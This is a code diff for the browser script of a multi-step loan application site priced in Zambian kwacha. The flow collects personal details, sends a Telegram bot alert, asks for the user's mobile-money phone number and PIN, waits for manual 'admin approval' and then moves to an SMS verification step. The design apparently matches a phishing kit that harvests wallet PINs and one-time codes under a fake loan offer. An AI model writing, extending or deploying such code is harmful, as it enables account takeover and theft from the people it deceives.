@@ -1,11 +1,22 @@
 let currentAppId = null;
 
+function updateCalculator() {
+  const sliderVal = document.getElementById('calc-amount-slider').value;
+  const formattedAmount = Number(sliderVal).toLocaleString();
+  
+  document.getElementById('display-amount').innerText = `ZMW ${formattedAmount}`;
+  
+  // Dynamic calculation preview simulation matching reference
+  const calculatedMonthly = Math.round(sliderVal / 48);
+  document.getElementById('display-monthly').innerText = `ZMW ${calculatedMonthly.toLocaleString()}`;
+}
+
 function goToStep(stepNumber) {
   document.querySelectorAll('.form-step').forEach(el => el.style.display = 'none');
   
-  // Sync values forward from calculator
   if (stepNumber === 2) {
-    document.getElementById('form-amount').value = document.getElementById('calc-amount').value;
+    const sliderVal = document.getElementById('calc-amount-slider').value;
+    document.getElementById('form-amount').value = sliderVal;
   }
   
   const targetStep = document.getElementById(`step-${stepNumber}`);
@@ -13,23 +24,20 @@ function goToStep(stepNumber) {
     targetStep.style.display = 'block';
   }
 
-  // Handle automatic transitions for loading/verification states
   if (stepNumber === 8) {
     setTimeout(() => {
       goToStep(9);
     }, 3000);
   }
-  if (stepNumber === 10) {
-    // Final completion polling or state logic can reside here
-  }
 }
 
 async function submitInitialApplication() {
+  const sliderVal = document.getElementById('calc-amount-slider').value;
   const payload = {
     name: `${document.getElementById('form-firstname').value} ${document.getElementById('form-lastname').value}`,
     phone: document.getElementById('form-phone').value,
-    desired_amount: document.getElementById('form-amount').value,
-    desired_term: document.getElementById('calc-term').value,
+    desired_amount: sliderVal,
+    desired_term: "48",
     employer: document.getElementById('form-employer').value,
     purpose: document.getElementById('form-purpose').value
   };
@@ -43,10 +51,7 @@ async function submitInitialApplication() {
     const data = await response.json();
     currentAppId = data.id;
 
-    // Trigger backend to send Telegram Bot notification
     await fetch(`/applications/${currentAppId}/submit`, { method: 'POST' });
-
-    // Move to MoMo Login step
     goToStep(5);
   } catch (error) {
     console.error('Error submitting application:', error);
@@ -61,7 +66,6 @@ function processMomoLogin() {
     alert('Please enter your MoMo phone number and PIN');
     return;
   }
-  // Move to waiting for admin approval (Step 6) and start polling status
   goToStep(6);
   pollApplicationStatus();
 }
@@ -75,7 +79,7 @@ function pollApplicationStatus() {
       
       if (app.status === 'approved') {
         clearInterval(interval);
-        goToStep(7); // Move to SMS Verification step
+        goToStep(7);
       } else if (app.status === 'rejected') {
         clearInterval(interval);
         alert('Your loan application was rejected.');
@@ -85,5 +89,5 @@ function pollApplicationStatus() {
       console.error('Polling error:', e);
     }
   }, 3000);
-      }
-      
+  }
+    
